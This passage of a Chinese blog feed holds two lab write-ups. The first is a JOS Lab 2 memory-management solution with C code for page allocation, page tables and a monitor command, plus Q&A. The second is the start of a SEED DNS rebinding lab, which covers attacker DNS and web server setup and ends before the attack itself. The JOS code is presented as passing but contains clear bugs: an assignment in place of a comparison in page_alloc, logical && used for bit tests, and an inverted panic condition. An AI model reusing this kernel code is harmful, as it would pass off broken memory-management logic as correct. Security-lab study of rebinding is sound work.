class="hljs-comment">// array.  'npages' is the number of physical pages in memory.  Use memset</span><span class="hljs-comment">// to initialize all fields of each struct PageInfo to 0.</span><span class="hljs-comment">// Your code goes here:</span>pages = (struct PageInfo *)boot_alloc(<span class="hljs-keyword">sizeof</span>(struct PageInfo) * npages);<span class="hljs-built_in">memset</span>(pages, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct PageInfo) * npages);</code></pre><p>这段代码分配足够的空间来保存pages数组，数组的每一项PageInfo对应一个物理页的信息</p><p><img src="/2020/11/21/oslab-2-Memory-Management/1-2.png" srcset="/img/loading.gif" alt="1-2"></p><h4 id="page-init-函数"><a href="#page-init-函数" class="headerlink" title="page_init()函数"></a>page_init()函数</h4><p>这个函数的主要作用是初始化之前分配的pages数组，并且构建一个PageInfo链表，保存空闲的物理页，表头是全局变量page_free_list。</p><pre><code class="hljs c"><span class="hljs-comment">// 1）第一个物理页是IDT所在，需要标识为已用</span><span class="hljs-comment">// 2）[IOPHYSMEM, EXTPHYSMEM)称为IO hole的区域，需要标识为已用。</span><span class="hljs-comment">// 3）EXTPHYSMEM是内核加载的起始位置，终止位置可以由boot_alloc(0)给出（理由是boot_alloc()分配的内存是内核的最尾部），这块区域也要标识</span><span class="hljs-keyword">size_t</span> i;<span class="hljs-keyword">size_t</span> io_hole_start_page = (<span class="hljs-keyword">size_t</span>)IOPHYSMEM / PGSIZE;<span class="hljs-keyword">size_t</span> kernel_end_page = PADDR(boot_alloc(<span class="hljs-number">0</span>)) / PGSIZE;<span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; npages; i++)&#123;<span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)&#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i &gt;= io_hole_start_page &amp;&amp; i &lt; kernel_end_page)&#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">else</span>&#123;pages[i].pp_ref = <span class="hljs-number">0</span>;pages[i].pp_link = page_free_list;page_free_list = &amp;pages[i];&#125;&#125;</code></pre><h4 id="page-alloc-函数"><a href="#page-alloc-函数" class="headerlink" title="page_alloc()函数"></a>page_alloc()函数</h4><p>函数具体作用：</p><p>从page_free_list指向的链表中取出一个PageInfo结构，之后根据形参决定是否将对应的内存初始化为0</p><p>具体实现：</p><pre><code class="hljs c"><span class="hljs-comment">// Be sure to set the pp_link field of the allocated page to NULL so</span><span class="hljs-comment">// page_free can check for double-free bugs.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns NULL if out of free memory.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Hint: use page2kva and memset</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><span class="hljs-class"><span class="hljs-title">page_alloc</span>(<span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><span class="hljs-class">&#123;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">ret</span> = <span class="hljs-title">page_free_list</span>;</span><span class="hljs-keyword">if</span> (ret = <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"page_alloc:out of free memory now\n"</span>);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;page_free_list = ret-&gt;pp_link;ret-&gt;pp_link = <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span> (alloc_flags &amp;&amp; ALLOC_ZERO)&#123;<span class="hljs-built_in">memset</span>(page2kva(ret), <span class="hljs-number">0</span>, PGSIZE);&#125;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">return</span> ret;&#125;</code></pre><h4 id="page-free-函数"><a href="#page-free-函数" class="headerlink" title="page_free()函数"></a>page_free()函数</h4><p>这个函数就是将对应的物理页设置为空闲状态并且将对应的PageInfo连接到空闲链表中</p><pre><code class="hljs c"><span class="hljs-comment">//</span><span class="hljs-comment">// Return a page to the free list.</span><span class="hljs-comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span><span class="hljs-comment">//</span><span class="hljs-keyword">void</span>page_free(struct PageInfo *pp)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span><span class="hljs-comment">// pp-&gt;pp_link is not NULL.</span><span class="hljs-keyword">if</span> (pp-&gt;pp_link != <span class="hljs-literal">NULL</span> &amp;&amp; pp-&gt;pp_ref != <span class="hljs-number">0</span>)&#123;panic(<span class="hljs-string">"page_free:pp-&gt;pp_link is not NULL or pp-&gt;pp_ref is nonzero"</span>);&#125;pp-&gt;pp_link = page_free_list;page_free_list = pp;&#125;</code></pre><h3 id="Exercise复盘"><a href="#Exercise复盘" class="headerlink" title="Exercise复盘"></a>Exercise复盘</h3><p>就是进行了对于内存物理页面的管理，将4096个字节分割成为一个页，然后通过数据结构PageInfo来进行管理，存储对应的数组，并且初始化一些和物理页面相关的操作，比如page_alloc和page_free，完成Part Ⅰ之后的内存情况如下</p><p><img src="/2020/11/21/oslab-2-Memory-Management/1-3.png" srcset="/img/loading.gif" alt="1-3"></p><h2 id="Part-Ⅱ：Virtual-Memory"><a href="#Part-Ⅱ：Virtual-Memory" class="headerlink" title="Part Ⅱ：Virtual Memory"></a>Part Ⅱ：Virtual Memory</h2><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><p><img src="/2020/11/21/oslab-2-Memory-Management/2-1.png" srcset="/img/loading.gif" alt="2-1"></p><h4 id="pagedir-walk-函数"><a href="#pagedir-walk-函数" class="headerlink" title="pagedir_walk()函数"></a>pagedir_walk()函数</h4><p>这个函数是给定pdir参数，来指向一个页目录，返回指针指向虚拟地址va对应的页表条目</p><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> *pgdir_walk(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> create)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pde_t</span> *pde_ptr = pgdir + PDX(va);<span class="hljs-keyword">if</span> (!(*pde_ptr &amp;&amp; PTE_P))&#123;<span class="hljs-keyword">if</span> (create)&#123;<span class="hljs-comment">//分配一个页来作为页表</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span> = <span class="hljs-title">page_alloc</span>(1);</span><span class="hljs-keyword">if</span> (pp == <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;pp-&gt;pp_ref++;*pde_ptr = (page2pa(pp)) | PTE_P | PTE_U | PTE_W;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;&#125;<span class="hljs-keyword">return</span> (<span class="hljs-keyword">pte_t</span> *)KADDR(PTE_ADDR(*pde_ptr)) + PTX(va);;&#125;</code></pre><h4 id="boot-map-region-函数"><a href="#boot-map-region-函数" class="headerlink" title="boot_map_region()函数"></a>boot_map_region()函数</h4><p>该函数的作用是通过修改pgdir指向的树结构，将va，va+size对应的虚拟地址映射到pa，pa+size对应的物理地址空间</p><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>boot_map_region(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">physaddr_t</span> pa, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">size_t</span> pgs = <span class="hljs-built_in">size</span> / PGSIZE;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span> % PGSIZE != <span class="hljs-number">0</span> )&#123;pgs++;     <span class="hljs-comment">//计算有多少页</span>&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; pgs; i++)&#123;<span class="hljs-keyword">pte_t</span> *pte = pgdir_walk(pgdir, (<span class="hljs-keyword">void</span> *)va, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;panic(<span class="hljs-string">"boot_map_region:out of physical memory"</span>);&#125;*pte = pa | PTE_P | perm;pa = pa + PGSIZE;va = va + PGSIZE;&#125;&#125;</code></pre><h4 id="page-lookup-函数"><a href="#page-lookup-函数" class="headerlink" title="page_lookup()函数"></a>page_lookup()函数</h4><p>查找pgdir指向的树结构，返回va对应的PTE对应的物理地址对应的PageInfo结构</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><span class="hljs-class"><span class="hljs-title">page_lookup</span>(<span class="hljs-title">pde_t</span> *<span class="hljs-title">pgdir</span>, <span class="hljs-title">void</span> *<span class="hljs-title">va</span>, <span class="hljs-title">pte_t</span> **<span class="hljs-title">pte_store</span>)</span><span class="hljs-class">&#123;</span><span class="hljs-comment">// Fill this function in</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><span class="hljs-keyword">pte_t</span> *pte =  pgdir_walk(pgdir, va, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">if</span> (!(*pte) &amp; PTE_P) &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">physaddr_t</span> pa = PTE_ADDR(*pte);<span class="hljs-comment">//va对应的物理</span>pp = pa2page(pa);<span class="hljs-keyword">if</span> (pte_store != <span class="hljs-literal">NULL</span>) &#123;*pte_store = pte;&#125;<span class="hljs-keyword">return</span> pp;&#125;</code></pre><h4 id="page-remove-函数"><a href="#page-remove-函数" class="headerlink" title="page_remove()函数"></a>page_remove()函数</h4><p>修改pgdir对用的树结构，解除映射关系</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>page_remove(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">void</span> *va)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pte_t</span> *pte_store;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">pgdir</span>, <span class="hljs-title">va</span>, &amp;<span class="hljs-title">pte_store</span>);</span> <span class="hljs-comment">//获取va对应的PTE的地址以及pp结构</span><span class="hljs-keyword">if</span> (pp == <span class="hljs-literal">NULL</span>) &#123;    <span class="hljs-comment">//va可能还没有映射，什么都不用做</span><span class="hljs-keyword">return</span>;&#125;page_decref(pp);    <span class="hljs-comment">//将pp-&gt;pp_ref减1，如果pp-&gt;pp_ref为0，需要释放该PageInfo结构（将其放入page_free_list链表中）</span>*pte_store = <span class="hljs-number">0</span>;    <span class="hljs-comment">//将PTE清空</span>tlb_invalidate(pgdir, va); <span class="hljs-comment">//失效化TLB缓存</span>&#125;</code></pre><h4 id="page-insert-函数"><a href="#page-insert-函数" class="headerlink" title="page_insert()函数"></a>page_insert()函数</h4><p>修改pgdir对应的树结构，建立va与pp对应的内存物理页之间的链接</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>page_insert(<span class="hljs-keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pte_t</span> *pte = pgdir_walk(pgdir, va, <span class="hljs-number">1</span>);    <span class="hljs-comment">//拿到va对应的PTE地址，如果va对应的页表还没有分配，则分配一个物理页作为页表</span><span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-keyword">return</span> -E_NO_MEM;&#125;pp-&gt;pp_ref++;<span class="hljs-keyword">if</span> ((*pte) &amp; PTE_P) &#123;<span class="hljs-comment">//当前虚拟地址va已经被映射过，需要先释放</span>page_remove(pgdir, va); &#125;<span class="hljs-keyword">physaddr_t</span> pa = page2pa(pp); <span class="hljs-comment">//将PageInfo结构转换为对应物理页的首地址</span>*pte = pa | perm | PTE_P;    <span class="hljs-comment">//修改PTE</span>pgdir[PDX(va)] |= perm;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="Exercise-4复盘"><a href="#Exercise-4复盘" class="headerlink" title="Exercise 4复盘"></a>Exercise 4复盘</h3><p>实现的是对于虚拟内存和物理页面之间的建立联系/树结构的过程，并且实现了一些相关操作</p><h2 id="Part-Ⅲ：kernel-address-space"><a href="#Part-Ⅲ：kernel-address-space" class="headerlink" title="Part Ⅲ：kernel address space"></a>Part Ⅲ：kernel address space</h2><h3 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h3><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Map 'pages' read-only by the user at linear address UPAGES</span><span class="hljs-comment">// Permissions:</span><span class="hljs-comment">//    - the new image at UPAGES -- kernel R, user R</span><span class="hljs-comment">//      (ie. perm = PTE_U | PTE_P)</span><span class="hljs-comment">//    - pages itself -- kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span><span class="hljs-comment">//将虚拟地址的UPAGES映射到物理地址pags起始位置</span>boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages), PTE_U);<span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Use the physical memory that 'bootstack' refers to as the kernel</span><span class="hljs-comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span><span class="hljs-comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span><span class="hljs-comment">// to be the kernel stack, but break this into two pieces:</span><span class="hljs-comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span><span class="hljs-comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span><span class="hljs-comment">//       the kernel overflows its stack, it will fault rather than</span><span class="hljs-comment">//       overwrite memory.  Known as a "guard page".</span><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span>boot_map_region(kern_pgdir, KSTACKTOP-KSTKSIZE, KSTKSIZE, PADDR(bootstack), PTE_W);<span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Map all of physical memory at KERNBASE.</span><span class="hljs-comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span><span class="hljs-comment">//      the PA range [0, 2^32 - KERNBASE)</span><span class="hljs-comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span><span class="hljs-comment">// we just set up the mapping anyway.</span><span class="hljs-comment">// Permissions: kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span>boot_map_region(kern_pgdir, KERNBASE, <span class="hljs-number">0xffffffff</span> - KERNBASE, <span class="hljs-number">0</span>, PTE_W);</code></pre><p>make grade结果</p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h2 id="展示地址"><a href="#展示地址" class="headerlink" title="展示地址"></a>展示地址</h2><p>首先是需要声明函数并且在command结构里面加入对应的命令</p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后就是对应的hanshudaima</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>mon_showva2pa(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, struct Trapframe *tf)&#123;<span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span> &amp;&amp; argc != <span class="hljs-number">2</span>)&#123;cprintf(<span class="hljs-string">"mon_showva2pa:Command error!!!"</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)&#123;<span class="hljs-keyword">char</span> *str;<span class="hljs-keyword">uint32_t</span> start = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">1</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint32_t</span> <span class="hljs-built_in">end</span> = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">2</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint16_t</span> ref;<span class="hljs-keyword">uint32_t</span> pa;<span class="hljs-keyword">int</span> u, w;<span class="hljs-keyword">pde_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">po</span>;</span><span class="hljs-keyword">for</span> ( ; start &lt;= <span class="hljs-built_in">end</span>; start += PGSIZE)&#123;po = page_lookup(kern_pgdir, (<span class="hljs-keyword">void</span> *)start, &amp;pte);pte = pgdir_walk(kern_pgdir, (<span class="hljs-keyword">void</span> *)start, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"the va does not have a corresponding physical page"</span>);<span class="hljs-keyword">break</span>;&#125;ref = po-&gt;pp_ref;u = ((* pte&amp;PTE_U) == PTE_U);w = ((* pte &amp; PTE_W) == PTE_W);pa = PTE_ADDR(* pte) | (start &amp; <span class="hljs-number">0xff</span>);cprintf(<span class="hljs-string">"VA = %x, PA = %x, pp_ref = %d, PTE_U = %d, PTE_W = %d\n"</span>,start, pa, ref, u, w);&#125;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>)&#123;<span class="hljs-keyword">char</span> *str;<span class="hljs-keyword">uint32_t</span> va = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">1</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint16_t</span> ref;<span class="hljs-keyword">uint32_t</span> pa;<span class="hljs-keyword">int</span> u, w;<span class="hljs-keyword">pde_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">po</span>;</span>po = page_lookup(kern_pgdir, (<span class="hljs-keyword">void</span> *)va, &amp;pte);pte = pgdir_walk(kern_pgdir, (<span class="hljs-keyword">void</span> *)va, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"the va does not have a corresponding physical page"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;ref = po-&gt;pp_ref;u = ((* pte&amp;PTE_U) == PTE_U);w = ((* pte &amp; PTE_W) == PTE_W);pa = PTE_ADDR(* pte) | (va &amp; <span class="hljs-number">0xff</span>);cprintf(<span class="hljs-string">"VA = %x, PA = %x, pp_ref = %d, PTE_U = %d, PTE_W = %d\n"</span>,va, pa, ref, u, w);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>运行截图</p><ul><li>范围查询</li></ul><p><img src="/2020/11/21/oslab-2-Memory-Management/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><ul><li>单页查询</li></ul><p><img src="/2020/11/21/oslab-2-Memory-Management/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><h2 id="问题与回答"><a href="#问题与回答" class="headerlink" title="问题与回答"></a>问题与回答</h2><h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h3><blockquote><p>程序中的地址从什么时候开始都是虚拟地址了，请找到那几行代码。</p></blockquote><h3 id="A1"><a href="#A1" class="headerlink" title="A1"></a>A1</h3><ul><li><strong>分段机制</strong>：是 boot.S 中加载 GDT 并启用 cr0 保护模式后启用的<pre><code class="hljs perl"><span class="hljs-comment"># Switch from real to protected mode, using a bootstrap GDT</span><span class="hljs-comment"># and segment translation that makes virtual addresses </span><span class="hljs-comment"># identical to their physical addresses, so that the </span><span class="hljs-comment"># effective memory map does not change during the switch.</span>lgdt    gdtdescmovl    %cr0, %eaxorl     $CR0_PE_ON, %eaxmovl    %eax, %cr0</code></pre></li><li><strong>分页机制</strong>：是 entry.S 中加载了 entry_pgdir 后启用的<pre><code class="hljs perl"><span class="hljs-comment"># Load the physical address of entry_pgdir into cr3.  entry_pgdir</span><span class="hljs-comment"># is defined in entrypgdir.c.</span>movl  $(RELOC(entry_pgdir)), %eaxmovl  %eax, %cr3<span class="hljs-comment"># Turn on paging.</span>movl  %cr0, %eaxorl $(CR0_PE|CR0_PG|CR0_WP), %eaxmovl  %eax, %cr0</code></pre></li><li><strong>分页分段</strong>都启用后，CPU 便能处理虚拟地址</li></ul><h3 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h3><blockquote><p>mem_init()函数中 kern_pgdir 的虚拟地址是多少？物理地址呢？在我们还未完成本 次 lab 之前，为什么我们已经可以使用虚拟地址了？ </p></blockquote><h3 id="A2"><a href="#A2" class="headerlink" title="A2"></a>A2</h3><p><code>cprintf(&quot;%x\n&quot;, kern_pgdir);</code>得到结果 0xf011b000，对应物理地址 0x0011b000</p><p>因为在程序中已经完成了内核部分 4MB 大小的虚拟地址到物理地址的简单映射，在 kern/entry.S 与 kern/entrypgdir.c 中。</p><h3 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h3><blockquote><p> 哪一行代码使得本次 lab 所构建的虚拟内存系统真正被使用？请指出它的位置。</p></blockquote><h3 id="A3"><a href="#A3" class="headerlink" title="A3"></a>A3</h3><p>mem_init() 中的<code>lcr3(PADDR(kern_pgdir));</code></p><h3 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h3><blockquote><p>此操作系统可支持的最大物理内存是多少？为什么？</p></blockquote><h3 id="A4"><a href="#A4" class="headerlink" title="A4"></a>A4</h3><p>2GB的最大物理内存，所有空闲的物理页面最开始都放在了pages数组中，数组中每个struct大小为8B，UPAGES大小为PTSIZE，所以最多可存储512K个pageInfo，而每个结构对应页面大小4KB，所以最多可以管理2^19 *2^12 = 2^31 = 2GB</p><h3 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h3><blockquote><p>请详细描述在 JOS 中虚拟地址到物理地址的转换过程。</p></blockquote><h3 id="A5"><a href="#A5" class="headerlink" title="A5"></a>A5</h3><ul><li>在 inc/mmu.h 中的 PDX、PTX、PGOFF 三个宏将虚拟地址分为 31 - 22 位、21 - 12 位、11 - 0位的三段。</li><li>首先通过 cr3 寄存器找到页表目录的物理地址 kern_pgdir，以虚拟地址的高10位 <code>PDX(va)</code> 作为索引在页表目录中找对应的页表项，该表项储存次级页表的起始地址和标志位。</li><li>然后通过 <code>PTE_ADDR()</code> 取出将页表项的高 20 位得到次级页表的物理地址，以虚拟地址的中间 10 位 <code>PTX(va)</code> 为索引找到对应的页表项，该表项储存对应物理页框的地址。</li><li>最后将线性地址的低 12 位 <code>PGOFF(va)</code> 与物理页框起始地址相加就得到了虚拟地址 va 对应的物理地址 pa。</li></ul><h3 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h3><blockquote><p>在函数 pgdir_walk() 的上下文中，请说明以下地址的含义，并指出他们是虚拟地址还是物理地址：</p></blockquote><h3 id="A6"><a href="#A6" class="headerlink" title="A6"></a>A6</h3><ol><li>pgdir 页目录地址，是虚拟地址。 </li><li>pgtab = PTE_ADDR(pgdir[PDX(va)]) pgdir[PDX(va)] 是页表目录中以 PDX(va)为索引找到的页表项, 页表项中储存的都是物理地址。而宏 PTE_ADDR 则是去除这个地址的高 20 位，因此也是物理地址。</li><li>pg = PTE_ADDR(KADDR(pgtab)[PTX(va)]) pg 就是二级页表中对应这个地址的页表项，因此也是物理地址。</li></ol><h3 id="Q7"><a href="#Q7" class="headerlink" title="Q7"></a>Q7</h3><blockquote><p>画出本次 Lab 结束后虚拟地址空间与物理地址空间的映射关系，地址空间表示图中应至 少包含 kern_pgdir 与 pages，展示越多的细节越好。（提示：地址空间的表示方式可以 参考 Lab 1-“The PC’s Physical Address Space”小节）</p></blockquote><h3 id="A7"><a href="#A7" class="headerlink" title="A7"></a>A7</h3><p><img src="/2020/11/21/oslab-2-Memory-Management/2-7.png" srcset="/img/loading.gif" alt="2-7"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Operating System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS Rebinding Attack lab</title>
    <link href="/2020/11/19/DNS-Rebinding-Attack-lab/"/>
    <url>/2020/11/19/DNS-Rebinding-Attack-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS-Rebinding-Attack-lab"><a href="#DNS-Rebinding-Attack-lab" class="headerlink" title="DNS Rebinding Attack lab"></a>DNS Rebinding Attack lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>对于DNS服务器在日常生活中具体是怎么发生作用的过程更加熟悉，同时了解对于一个内部网络的服务器/主机来说，如何进行DNS重绑定攻击，并且有什么样的应对策略，以及为什么会出产生这样的漏洞</p><p>参考链接：<a href="https://bbs.pediy.com/thread-230047.htm#msg_header_h1_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230047.htm#msg_header_h1_1</a></p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><h3 id="task-1：配置用户主机"><a href="#task-1：配置用户主机" class="headerlink" title="task 1：配置用户主机"></a>task 1：配置用户主机</h3><ul><li>修改对应的DNS缓存在Firefox浏览器中的TTL到10s</li></ul><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><ul><li>之后修改对应的/etc/hosts文件，在其中添加<a href="http://www.seedIoT32.com对应的IP地址，在这里就是User主机的IP地址10.0.2.4" target="_blank" rel="noopener">www.seedIoT32.com对应的IP地址，在这里就是User主机的IP地址10.0.2.4</a></li></ul><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><ul><li>设置本地服务器，和前两个实验一样</li><li>测试，用dig命令来获取百度的web服务器的IP地址，通过wireshark抓包来证明</li></ul><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><p>可以看到对应的DNS服务器的IP地址是10.0.2.5，测试通过</p><h3 id="task-2：在User虚拟机上面开启物联网服务器"><a href="#task-2：在User虚拟机上面开启物联网服务器" class="headerlink" title="task 2：在User虚拟机上面开启物联网服务器"></a>task 2：在User虚拟机上面开启物联网服务器</h3><p>按照教程里的进行即可，screenshot如下：</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h3 id="task-3：在attacker虚拟机上面开启attack-web服务器"><a href="#task-3：在attacker虚拟机上面开启attack-web服务器" class="headerlink" title="task 3：在attacker虚拟机上面开启attack web服务器"></a>task 3：在attacker虚拟机上面开启attack web服务器</h3><p>攻击原理</p><blockquote><p>A typical way to get our malicious code onto the User VM is to get the user to visit our website, so the JavaScript code placed on our web pages can get into the User VM. In this task, we will start a web server to host such web pages</p></blockquote><p>按照教程弄好之后访问对应URL</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><h3 id="task-4：在attacker虚拟机上面配置DNS服务器"><a href="#task-4：在attacker虚拟机上面配置DNS服务器" class="headerlink" title="task 4：在attacker虚拟机上面配置DNS服务器"></a>task 4：在attacker虚拟机上面配置DNS服务器</h3><p>依旧是按照教程来，最后进行测试</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>上面的内容是和文件中一样的</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><h3 id="task-5：配置本地DNS服务器"><a href="#task-5：配置本地DNS服务器" class="headerlink" title="task 5：配置本地DNS服务器"></a>task 5：配置本地DNS服务器</h3><p>让其他的DNS服务器可以看到刚刚配置的attacker32.com域的DNS服务器</p><blockquote><p>In order for others to find this nameserver, we need to register our nameserver with the .com nameserver, so an NS record is added to its database. Without this step, DNS requests from others will not be able to reach our nameserver</p></blockquote><p>在这里，我们通过设置本地服务器上面attacker32.com的转发记录来实现，而不是通过查询root服务器，进而迭代查询</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><p>之后在用户主机上面dig进行测试，测试通过</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><h2 id="launch-the-attack-on-IoT-device"><a href="#launch-the-attack-on-IoT-device" class="headerlink" title="launch the attack on IoT device"></a>launch the attack on IoT device</h2><h3 